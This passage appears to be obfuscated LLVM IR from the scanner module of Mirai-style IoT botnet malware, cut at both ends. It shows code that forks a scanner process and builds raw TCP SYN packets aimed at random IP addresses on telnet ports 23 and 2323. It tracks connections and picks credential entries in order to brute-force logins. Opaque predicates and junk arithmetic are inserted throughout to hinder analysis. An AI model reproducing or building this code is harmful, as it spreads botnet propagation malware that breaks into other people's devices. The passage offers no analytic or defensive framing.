  %1851 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %1852 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1851, i32 0, i32 6
  %1853 = load i32, i32* %1852, align 4
  %1854 = sub nsw i32 %1853, %1850
  store i32 %1854, i32* %1852, align 4
  %1855 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %1856 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1855, i32 0, i32 7
  %1857 = getelementptr inbounds [256 x i8], [256 x i8]* %1856, i32 0, i32 0
  %1858 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %1859 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1858, i32 0, i32 7
  %1860 = getelementptr inbounds [256 x i8], [256 x i8]* %1859, i32 0, i32 0
  %1861 = load i32, i32* %41, align 4
  %1862 = sext i32 %1861 to i64
  %1863 = getelementptr inbounds i8, i8* %1860, i64 %1862
  %1864 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %1865 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1864, i32 0, i32 6
  %1866 = load i32, i32* %1865, align 4
  %1867 = sext i32 %1866 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %1857, i8* %1863, i64 %1867, i32 1, i1 false)
  br label %1868

; <label>:1868:                                   ; preds = %1849
  br label %1315

; <label>:1869:                                   ; preds = %originalBBpart2358
  br label %1148

; <label>:1870:                                   ; preds = %1305, %1153
  br label %1871

; <label>:1871:                                   ; preds = %1870, %originalBBpart2243
  %1872 = load i32, i32* @x.63
  %1873 = load i32, i32* @y.64
  %1874 = sub i32 %1872, 1
  %1875 = mul i32 %1872, %1874
  %1876 = urem i32 %1875, 2
  %1877 = icmp eq i32 %1876, 0
  %1878 = icmp slt i32 %1873, 10
  %1879 = or i1 %1877, %1878
  br i1 %1879, label %originalBB360, label %originalBB360alteredBB

originalBB360:                                    ; preds = %originalBB360alteredBB, %1871
  %1880 = load i32, i32* @x.63
  %1881 = load i32, i32* @y.64
  %1882 = sub i32 %1880, 1
  %1883 = mul i32 %1880, %1882
  %1884 = urem i32 %1883, 2
  %1885 = icmp eq i32 %1884, 0
  %1886 = icmp slt i32 %1881, 10
  %1887 = or i1 %1885, %1886
  br i1 %1887, label %originalBBpart2362, label %originalBB360alteredBB

originalBBpart2362:                               ; preds = %originalBB360
  br label %1888

; <label>:1888:                                   ; preds = %originalBBpart2362, %1086, %1017
  %1889 = load i32, i32* %9, align 4
  %1890 = add nsw i32 %1889, 1
  store i32 %1890, i32* %9, align 4
  br label %989

; <label>:1891:                                   ; preds = %989
  %1892 = load i32, i32* @x.63
  %1893 = load i32, i32* @y.64
  %1894 = sub i32 %1892, 1
  %1895 = mul i32 %1892, %1894
  %1896 = urem i32 %1895, 2
  %1897 = icmp eq i32 %1896, 0
  %1898 = icmp slt i32 %1893, 10
  %1899 = or i1 %1897, %1898
  br i1 %1899, label %originalBB364, label %originalBB364alteredBB

originalBB364:                                    ; preds = %originalBB364alteredBB, %1891
  %1900 = load i32, i32* @x.63
  %1901 = load i32, i32* @y.64
  %1902 = sub i32 %1900, 1
  %1903 = mul i32 %1900, %1902
  %1904 = urem i32 %1903, 2
  %1905 = icmp eq i32 %1904, 0
  %1906 = icmp slt i32 %1901, 10
  %1907 = or i1 %1905, %1906
  br i1 %1907, label %originalBBpart2366, label %originalBB364alteredBB

originalBBpart2366:                               ; preds = %originalBB364
  br label %229

originalBBalteredBB:                              ; preds = %originalBB, %0
  %1908 = alloca i32, align 4
  %1909 = alloca i16, align 2
  %1910 = alloca %struct.iphdr*, align 8
  %1911 = alloca %struct.tcphdr*, align 8
  %1912 = alloca %struct.fd_set.28, align 8
  %1913 = alloca %struct.fd_set.28, align 8
  %1914 = alloca %struct.scanner_connection*, align 8
  %1915 = alloca %struct.timeval.29, align 8
  %1916 = alloca i32, align 4
  %1917 = alloca i32, align 4
  %1918 = alloca i32, align 4
  %1919 = alloca i32, align 4
  %1920 = alloca i32, align 4
  %1921 = alloca %struct.sockaddr_in, align 4
  %1922 = alloca %struct.iphdr*, align 8
  %1923 = alloca %struct.tcphdr*, align 8
  %1924 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %1925 = alloca i32, align 4
  %1926 = alloca [1514 x i8], align 16
  %1927 = alloca %struct.iphdr*, align 8
  %1928 = alloca %struct.tcphdr*, align 8
  %1929 = alloca %struct.scanner_connection*, align 8
  %1930 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %1931 = alloca i32, align 4
  %1932 = alloca i32, align 4
  %1933 = alloca i32, align 4
  %1934 = alloca i32, align 4
  %1935 = alloca i32, align 4
  %1936 = alloca i32, align 4
  %1937 = alloca i32, align 4
  %1938 = alloca i32, align 4
  %1939 = alloca i32, align 4
  %1940 = alloca i32, align 4
  %1941 = alloca i8*, align 8
  %1942 = alloca i32, align 4
  %1943 = alloca i8*, align 8
  %1944 = alloca i32, align 4
  %1945 = alloca i8*, align 8
  %1946 = alloca i32, align 4
  %1947 = alloca i8*, align 8
  %1948 = alloca i32, align 4
  %1949 = alloca i8*, align 8
  %1950 = alloca i32, align 4
  %1951 = alloca i8*, align 8
  %1952 = alloca i32, align 4
  %1953 = call i32 @fork() #6
  store i32 %1953, i32* @scanner_pid, align 4
  %1954 = load i32, i32* @scanner_pid, align 4
  %1955 = icmp sgt i32 %1954, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %78
  %1956 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %1957 = load i32, i32* %9, align 4
  %1958 = sext i32 %1957 to i64
  %1959 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1956, i64 %1958
  %1960 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1959, i32 0, i32 3
  store i32 0, i32* %1960, align 8
  %1961 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %1962 = load i32, i32* %9, align 4
  %1963 = sext i32 %1962 to i64
  %1964 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1961, i64 %1963
  %1965 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1964, i32 0, i32 1
  store i32 -1, i32* %1965, align 8
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %108
  %1966 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %1966, i32* @rsck, align 4
  %1967 = icmp eq i32 %1966, -1
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %128
  %1968 = load i32, i32* @rsck, align 4
  %1969 = load i32, i32* @rsck, align 4
  %1970 = call i32 (i32, i32, ...) @fcntl(i32 %1969, i32 3, i32 0)
  %_ = sub i32 2048, %1970
  %gen = mul i32 %_, %1970
  %_11 = shl i32 2048, %1970
  %_12 = sub i32 2048, %1970
  %gen13 = mul i32 %_12, %1970
  %_14 = sub i32 0, 2048
  %gen15 = add i32 %_14, %1970
  %_16 = sub i32 2048, %1970
  %gen17 = mul i32 %_16, %1970
  %_18 = shl i32 2048, %1970
  %1971 = or i32 2048, %1970
  %1972 = call i32 (i32, i32, ...) @fcntl(i32 %1968, i32 4, i32 %1971)
  store i32 1, i32* %9, align 4
  %1973 = load i32, i32* @rsck, align 4
  %1974 = bitcast i32* %9 to i8*
  %1975 = call i32 @setsockopt(i32 %1973, i32 0, i32 3, i8* %1974, i32 4) #6
  %1976 = icmp ne i32 %1975, 0
  br label %originalBB10

originalBB22alteredBB:                            ; preds = %originalBB22, %162
  %1977 = load i16, i16* %10, align 2
  %1978 = call zeroext i16 @ntohs(i16 zeroext %1977) #7
  %1979 = zext i16 %1978 to i32
  %1980 = icmp slt i32 %1979, 1024
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %233
  %1981 = load i32, i32* @fake_time, align 4
  store i32 %1981, i32* %18, align 4
  store i32 0, i32* %9, align 4
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %254
  %1982 = bitcast %struct.sockaddr_in* %22 to i8*
  call void @llvm.memset.p0i8.i64(i8* %1982, i8 0, i64 16, i32 4, i1 false)
  store %struct.iphdr* bitcast ([40 x i8]* @scanner_rawpkt to %struct.iphdr*), %struct.iphdr** %23, align 8
  %1983 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %1984 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %1983, i64 1
  %1985 = bitcast %struct.iphdr* %1984 to %struct.tcphdr*
  store %struct.tcphdr* %1985, %struct.tcphdr** %24, align 8
  %1986 = call i32 @rand_next()
  %1987 = trunc i32 %1986 to i16
  %1988 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %1989 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %1988, i32 0, i32 3
  store i16 %1987, i16* %1989, align 4
  %1990 = load i32, i32* @LOCAL_ADDR, align 4
  %1991 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %1992 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %1991, i32 0, i32 8
  store i32 %1990, i32* %1992, align 4
  %1993 = call i32 @get_random_ip()
  %1994 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %1995 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %1994, i32 0, i32 9
  store i32 %1993, i32* %1995, align 4
  %1996 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %1997 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %1996, i32 0, i32 7
  store i16 0, i16* %1997, align 2
  %1998 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %1999 = bitcast %struct.iphdr* %1998 to i16*
  %2000 = call zeroext i16 @checksum_generic(i16* %1999, i32 20)
  %2001 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %2002 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %2001, i32 0, i32 7
  store i16 %2000, i16* %2002, align 2
  %2003 = load i32, i32* %9, align 4
  %_31 = sub i32 %2003, 10
  %gen32 = mul i32 %_31, 10
  %_33 = sub i32 0, %2003
  %gen34 = add i32 %_33, 10
  %_35 = shl i32 %2003, 10
  %_36 = shl i32 %2003, 10
  %2004 = srem i32 %2003, 10
  %2005 = icmp eq i32 %2004, 0
  br label %originalBB30

originalBB40alteredBB:                            ; preds = %originalBB40, %295
  %2006 = call zeroext i16 @htons(i16 zeroext 2323) #7
  %2007 = load %struct.tcphdr*, %struct.tcphdr** %24, align 8
  %2008 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %2007, i32 0, i32 1
  store i16 %2006, i16* %2008, align 2
  br label %originalBB40

originalBB44alteredBB:                            ; preds = %originalBB44, %315
  %2009 = call zeroext i16 @htons(i16 zeroext 23) #7
  %2010 = load %struct.tcphdr*, %struct.tcphdr** %24, align 8
  %2011 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %2010, i32 0, i32 1
  store i16 %2009, i16* %2011, align 2
  br label %originalBB44

originalBB48alteredBB:                            ; preds = %originalBB48, %371
  %2012 = getelementptr inbounds [1514 x i8], [1514 x i8]* %27, i32 0, i32 0
  %2013 = bitcast i8* %2012 to %struct.iphdr*
  store %struct.iphdr* %2013, %struct.iphdr** %28, align 8
  %2014 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %2015 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %2014, i64 1
  %2016 = bitcast %struct.iphdr* %2015 to %struct.tcphdr*
  store %struct.tcphdr* %2016, %struct.tcphdr** %29, align 8
  %2017 = call i32* @__errno_location() #7
  store i32 0, i32* %2017, align 4
  %2018 = load i32, i32* @rsck, align 4
  %2019 = getelementptr inbounds [1514 x i8], [1514 x i8]* %27, i32 0, i32 0
  %2020 = bitcast %union.__CONST_SOCKADDR_ARG* %31 to %struct.sockaddr**
  store %struct.sockaddr* null, %struct.sockaddr** %2020, align 8
  %2021 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %31, i32 0, i32 0
  %2022 = load %struct.sockaddr*, %struct.sockaddr** %2021, align 8
  %2023 = call i64 @recvfrom(i32 %2018, i8* %2019, i64 1514, i32 16384, %struct.sockaddr* %2022, i32* null)
  %2024 = trunc i64 %2023 to i32
  store i32 %2024, i32* %26, align 4
  %2025 = load i32, i32* %26, align 4
  %2026 = icmp sle i32 %2025, 0
  br label %originalBB48

originalBB52alteredBB:                            ; preds = %originalBB52, %411
  br label %originalBB52

originalBB56alteredBB:                            ; preds = %originalBB56, %428
  %2027 = load i32, i32* %26, align 4
  %2028 = sext i32 %2027 to i64
  %2029 = icmp ult i64 %2028, 40
  br label %originalBB56

originalBB60alteredBB:                            ; preds = %originalBB60, %449
  %2030 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %2031 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %2030, i32 0, i32 9
  %2032 = load i32, i32* %2031, align 4
  %2033 = load i32, i32* @LOCAL_ADDR, align 4
  %2034 = icmp ne i32 %2032, %2033
  br label %originalBB60

originalBB64alteredBB:                            ; preds = %originalBB64, %478
  br label %originalBB64

originalBB68alteredBB:                            ; preds = %originalBB68, %520
  br label %originalBB68

originalBB72alteredBB:                            ; preds = %originalBB72, %544
  br label %originalBB72

originalBB76alteredBB:                            ; preds = %originalBB76, %577
  %2035 = load %struct.tcphdr*, %struct.tcphdr** %29, align 8
  %2036 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %2035, i32 0, i32 4
  %2037 = load i16, i16* %2036, align 4
  %_77 = sub i16 %2037, 8
  %gen78 = mul i16 %_77, 8
  %2038 = lshr i16 %2037, 8
  %_79 = sub i16 %2038, 1
  %gen80 = mul i16 %_79, 1
  %_81 = sub i16 0, %2038
  %gen82 = add i16 %_81, 1
  %_83 = shl i16 %2038, 1
  %_84 = sub i16 0, %2038
  %gen85 = add i16 %_84, 1
  %_86 = sub i16 %2038, 1
  %gen87 = mul i16 %_86, 1
  %2039 = and i16 %2038, 1
  %2040 = icmp ne i16 %2039, 0
  br label %originalBB76

originalBB91alteredBB:                            ; preds = %originalBB91, %636
  %2041 = load %struct.scanner_connection*, %struct.scanner_connection** %30, align 8
  %2042 = icmp eq %struct.scanner_connection* %2041, null
  br label %originalBB91

originalBB95alteredBB:                            ; preds = %originalBB95, %655
  br label %originalBB95

originalBB99alteredBB:                            ; preds = %originalBB99, %730
  %2043 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %2044 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2043, i32 0, i32 1
  %2045 = load i32, i32* %2044, align 8
  %2046 = call i32 @close(i32 %2045)
  %2047 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %2048 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2047, i32 0, i32 1
  store i32 -1, i32* %2048, align 8
  %2049 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %2050 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2049, i32 0, i32 3
  %2051 = load i32, i32* %2050, align 8
  %2052 = icmp ugt i32 %2051, 2
  br label %originalBB99

originalBB103alteredBB:                           ; preds = %originalBB103, %764
  %2053 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %2054 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2053, i32 0, i32 8
  store i8 0, i8* %2054, align 8
  %2055 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %2056 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2055, i32 0, i32 3
  store i32 0, i32* %2056, align 8
  br label %originalBB103

originalBB107alteredBB:                           ; preds = %originalBB107, %788
  %2057 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %2058 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2057, i32 0, i32 8
  store i8 0, i8* %2058, align 8
  %2059 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %2060 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2059, i32 0, i32 3
  store i32 0, i32* %2060, align 8
  br label %originalBB107

originalBB111alteredBB:                           ; preds = %originalBB111, %810
  %2061 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %2062 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2061, i32 0, i32 3
  %2063 = load i32, i32* %2062, align 8
  %2064 = icmp eq i32 %2063, 1
  br label %originalBB111

originalBB115alteredBB:                           ; preds = %originalBB115, %831
  %2065 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %2066 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2065, i32 0, i32 1
  %2067 = load i32, i32* %2066, align 8
  %_116 = sub i32 %2067, 64
  %gen117 = mul i32 %_116, 64
  %_118 = shl i32 %2067, 64
  %_119 = shl i32 %2067, 64
  %_120 = sub i32 0, %2067
  %gen121 = add i32 %_120, 64
  %2068 = srem i32 %2067, 64
  %2069 = zext i32 %2068 to i64
  %_122 = sub i64 1, %2069
  %gen123 = mul i64 %_122, %2069
  %_124 = sub i64 0, 1
  %gen125 = add i64 %_124, %2069
  %_126 = sub i64 1, %2069
  %gen127 = mul i64 %_126, %2069
  %_128 = shl i64 1, %2069
  %_129 = shl i64 1, %2069
  %_130 = sub i64 0, 1
  %gen131 = add i64 %_130, %2069
  %_132 = sub i64 1, %2069
  %gen133 = mul i64 %_132, %2069
  %2070 = shl i64 1, %2069
  %2071 = getelementptr inbounds %struct.fd_set.28, %struct.fd_set.28* %14, i32 0, i32 0
  %2072 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %2073 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2072, i32 0, i32 1
  %2074 = load i32, i32* %2073, align 8
  %_134 = sub i32 0, %2074
  %gen135 = add i32 %_134, 64
  %_136 = sub i32 0, %2074
  %gen137 = add i32 %_136, 64
  %_138 = sub i32 %2074, 64
  %gen139 = mul i32 %_138, 64
  %_140 = shl i32 %2074, 64
  %2075 = sdiv i32 %2074, 64
  %2076 = sext i32 %2075 to i64
  %2077 = getelementptr inbounds [16 x i64], [16 x i64]* %2071, i64 0, i64 %2076
  %2078 = load i64, i64* %2077, align 8
  %_141 = shl i64 %2078, %2070
  %_142 = sub i64 0, %2078
  %gen143 = add i64 %_142, %2070
  %2079 = or i64 %2078, %2070
  store i64 %2079, i64* %2077, align 8
  %2080 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %2081 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2080, i32 0, i32 1
  %2082 = load i32, i32* %2081, align 8
  %2083 = load i32, i32* %20, align 4
  %2084 = icmp sgt i32 %2082, %2083
  br label %originalBB115

originalBB147alteredBB:                           ; preds = %originalBB147, %872
  br label %originalBB147

originalBB151alteredBB:                           ; preds = %originalBB151, %894
  %2085 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %2086 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2085, i32 0, i32 1
  %2087 = load i32, i32* %2086, align 8
  %_152 = shl i32 %2087, 64
  %2088 = srem i32 %2087, 64
  %2089 = zext i32 %2088 to i64
  %_153 = sub i64 1, %2089
  %gen154 = mul i64 %_153, %2089
  %_155 = shl i64 1, %2089
  %_156 = shl i64 1, %2089
  %_157 = sub i64 1, %2089
  %gen158 = mul i64 %_157, %2089
  %_159 = sub i64 0, 1
  %gen160 = add i64 %_159, %2089
  %_161 = sub i64 1, %2089
  %gen162 = mul i64 %_161, %2089
  %_163 = shl i64 1, %2089
  %_164 = sub i64 1, %2089
  %gen165 = mul i64 %_164, %2089
  %_166 = sub i64 0, 1
  %gen167 = add i64 %_166, %2089
  %2090 = shl i64 1, %2089
  %2091 = getelementptr inbounds %struct.fd_set.28, %struct.fd_set.28* %13, i32 0, i32 0
  %2092 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %2093 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2092, i32 0, i32 1
  %2094 = load i32, i32* %2093, align 8
  %_168 = sub i32 %2094, 64
  %gen169 = mul i32 %_168, 64
  %_170 = sub i32 %2094, 64
  %gen171 = mul i32 %_170, 64
  %2095 = sdiv i32 %2094, 64
  %2096 = sext i32 %2095 to i64
  %2097 = getelementptr inbounds [16 x i64], [16 x i64]* %2091, i64 0, i64 %2096
  %2098 = load i64, i64* %2097, align 8
  %_172 = sub i64 %2098, %2090
  %gen173 = mul i64 %_172, %2090
  %_174 = sub i64 0, %2098
  %gen175 = add i64 %_174, %2090
  %_176 = sub i64 0, %2098
  %gen177 = add i64 %_176, %2090
  %_178 = sub i64 %2098, %2090
  %gen179 = mul i64 %_178, %2090
  %_180 = sub i64 %2098, %2090
  %gen181 = mul i64 %_180, %2090
  %2099 = or i64 %2098, %2090
  store i64 %2099, i64* %2097, align 8
  %2100 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %2101 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2100, i32 0, i32 1
  %2102 = load i32, i32* %2101, align 8
  %2103 = load i32, i32* %19, align 4
  %2104 = icmp sgt i32 %2102, %2103
  br label %originalBB151

originalBB185alteredBB:                           ; preds = %originalBB185, %931
  %2105 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %2106 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2105, i32 0, i32 1
  %2107 = load i32, i32* %2106, align 8
  store i32 %2107, i32* %19, align 4
  br label %originalBB185

originalBB189alteredBB:                           ; preds = %originalBB189, %951
  br label %originalBB189

originalBB193alteredBB:                           ; preds = %originalBB193, %992
  %2108 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %2109 = load i32, i32* %9, align 4
  %2110 = sext i32 %2109 to i64
  %2111 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2108, i64 %2110
  store %struct.scanner_connection* %2111, %struct.scanner_connection** %15, align 8
  %2112 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %2113 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2112, i32 0, i32 1
  %2114 = load i32, i32* %2113, align 8
  %2115 = icmp eq i32 %2114, -1
  br label %originalBB193

originalBB197alteredBB:                           ; preds = %originalBB197, %1035
  store i32 0, i32* %37, align 4
  store i32 0, i32* %38, align 4
  store i32 4, i32* %39, align 4
  %2116 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %2117 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2116, i32 0, i32 1
  %2118 = load i32, i32* %2117, align 8
  %2119 = bitcast i32* %37 to i8*
  %2120 = call i32 @getsockopt(i32 %2118, i32 1, i32 4, i8* %2119, i32* %39) #6
  store i32 %2120, i32* %38, align 4
  %2121 = load i32, i32* %37, align 4
  %2122 = icmp eq i32 %2121, 0
  br label %originalBB197

originalBB201alteredBB:                           ; preds = %originalBB201, %1062
  %2123 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %2124 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2123, i32 0, i32 3
  store i32 2, i32* %2124, align 8
  %2125 = call %struct.scanner_auth* @random_auth_entry()
  %2126 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %2127 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2126, i32 0, i32 0
  store %struct.scanner_auth* %2125, %struct.scanner_auth** %2127, align 8
  %2128 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %2129 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2128, i32 0, i32 6
  store i32 0, i32* %2129, align 4
  br label %originalBB201

originalBB205alteredBB:                           ; preds = %originalBB205, %1097
  br label %originalBB205

originalBB209alteredBB:                           ; preds = %originalBB209, %1114
  %2130 = getelementptr inbounds %struct.fd_set.28, %struct.fd_set.28* %13, i32 0, i32 0
  %2131 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %2132 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2131, i32 0, i32 1
  %2133 = load i32, i32* %2132, align 8
  %_210 = sub i32 %2133, 64
  %gen211 = mul i32 %_210, 64
  %_212 = sub i32 0, %2133
  %gen213 = add i32 %_212, 64
  %_214 = sub i32 0, %2133
  %gen215 = add i32 %_214, 64
  %_216 = sub i32 %2133, 64
  %gen217 = mul i32 %_216, 64
  %2134 = sdiv i32 %2133, 64
  %2135 = sext i32 %2134 to i64
  %2136 = getelementptr inbounds [16 x i64], [16 x i64]* %2130, i64 0, i64 %2135
  %2137 = load i64, i64* %2136, align 8
  %2138 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %2139 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2138, i32 0, i32 1
  %2140 = load i32, i32* %2139, align 8
  %_218 = shl i32 %2140, 64
  %_219 = sub i32 %2140, 64
  %gen220 = mul i32 %_219, 64
  %_221 = sub i32 0, %2140
  %gen222 = add i32 %_221, 64
  %_223 = sub i32 0, %2140
  %gen224 = add i32 %_223, 64
  %_225 = shl i32 %2140, 64
  %_226 = shl i32 %2140, 64
  %_227 = sub i32 %2140, 64
  %gen228 = mul i32 %_227, 64
  %2141 = srem i32 %2140, 64
  %2142 = zext i32 %2141 to i64
  %_229 = sub i64 1, %2142
  %gen230 = mul i64 %_229, %2142
  %_231 = shl i64 1, %2142
  %2143 = shl i64 1, %2142
  %_232 = shl i64 %2137, %2143
  %_233 = shl i64 %2137, %2143
  %_234 = sub i64 %2137, %2143
  %gen235 = mul i64 %_234, %2143
  %_236 = sub i64 %2137, %2143
  %gen237 = mul i64 %_236, %2143
  %_238 = shl i64 %2137, %2143
  %_239 = shl i64 %2137, %2143
  %_240 = sub i64 0, %2137
  %gen241 = add i64 %_240, %2143
  %2144 = and i64 %2137, %2143
  %2145 = icmp ne i64 %2144, 0
  br label %originalBB209

originalBB245alteredBB:                           ; preds = %originalBB245, %1154
  %2146 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %2147 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2146, i32 0, i32 6
  %2148 = load i32, i32* %2147, align 4
  %2149 = icmp eq i32 %2148, 256
  br label %originalBB245

originalBB249alteredBB:                           ; preds = %originalBB249, %1175
  %2150 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %2151 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2150, i32 0, i32 7
  %2152 = getelementptr inbounds [256 x i8], [256 x i8]* %2151, i32 0, i32 0
  %2153 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %2154 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2153, i32 0, i32 7
  %2155 = getelementptr inbounds [256 x i8], [256 x i8]* %2154, i32 0, i32 0
  %2156 = getelementptr inbounds i8, i8* %2155, i64 64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %2152, i8* %2156, i64 192, i32 1, i1 false)
  %2157 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %2158 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2157, i32 0, i32 6
  %2159 = load i32, i32* %2158, align 4
  %_250 = shl i32 %2159, 64
  %2160 = sub nsw i32 %2159, 64
  store i32 %2160, i32* %2158, align 4
  br label %originalBB249

originalBB255alteredBB:                           ; preds = %originalBB255, %1203
  %2161 = call i32* @__errno_location() #7
  store i32 0, i32* %2161, align 4
  %2162 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %2163 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2162, i32 0, i32 1
  %2164 = load i32, i32* %2163, align 8
  %2165 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %2166 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2165, i32 0, i32 7
  %2167 = getelementptr inbounds [256 x i8], [256 x i8]* %2166, i32 0, i32 0
  %2168 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %2169 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2168, i32 0, i32 6
  %2170 = load i32, i32* %2169, align 4
  %2171 = sext i32 %2170 to i64
  %2172 = getelementptr inbounds i8, i8* %2167, i64 %2171
  %2173 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %2174 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2173, i32 0, i32 6
  %2175 = load i32, i32* %2174, align 4
  %_256 = sub i32 256, %2175
  %gen257 = mul i32 %_256, %2175
  %_258 = sub i32 256, %2175
  %gen259 = mul i32 %_258, %2175
  %_260 = sub i32 256, %2175
  %gen261 = mul i32 %_260, %2175
  %_262 = sub i32 256, %2175
  %gen263 = mul i32 %_262, %2175
  %_264 = sub i32 256, %2175
  %gen265 = mul i32 %_264, %2175
  %_266 = sub i32 0, 256
  %gen267 = add i32 %_266, %2175
  %2176 = sub nsw i32 256, %2175
  %2177 = call i32 @recv_strip_null(i32 %2164, i8* %2172, i32 %2176, i32 16384)
  store i32 %2177, i32* %40, align 4
  %2178 = load i32, i32* %40, align 4
  %2179 = icmp eq i32 %2178, 0
  br label %originalBB255

originalBB271alteredBB:                           ; preds = %originalBB271, %1244
  %2180 = call i32* @__errno_location() #7
  %2181 = load i32, i32* %2180, align 4
  %2182 = icmp ne i32 %2181, 11
  br label %originalBB271

originalBB275alteredBB:                           ; preds = %originalBB275, %1268
  %2183 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %2184 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2183, i32 0, i32 1
